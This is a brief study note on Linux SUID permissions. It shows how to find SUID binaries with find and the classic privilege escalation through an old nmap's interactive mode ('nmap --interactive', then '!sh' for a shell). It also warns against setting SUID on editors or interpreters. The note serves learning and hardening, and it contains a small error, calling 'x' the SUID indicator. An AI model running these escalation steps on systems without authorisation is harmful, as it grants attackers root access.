SUID which stands for set user ID, is a Linux feature that allows users to execute a file with the permissions of a specified user.

```
 -rwsr-xr-x            ‘x’ indicates SUID bit is set
```

![](Pasted%20image%2020250701095444.png)

suid should not be set on any kind of editor as attacker and overwrite whole system

```
find / -perm -u=s -type f 2>/dev/null      print exec suid bit set
```

![](Pasted%20image%2020250701095808.png)

```
ls -la /usr/local/bin/nmap   nmap has set suid bit
```

Nmap older version have fun to run it with interactive mode

```
nmap –interactive           
!sh                          let you escape from shell
```

Never set suid to any file editor/compiler/interpreter as an attacker can easily read/overwrite any files present on the system.


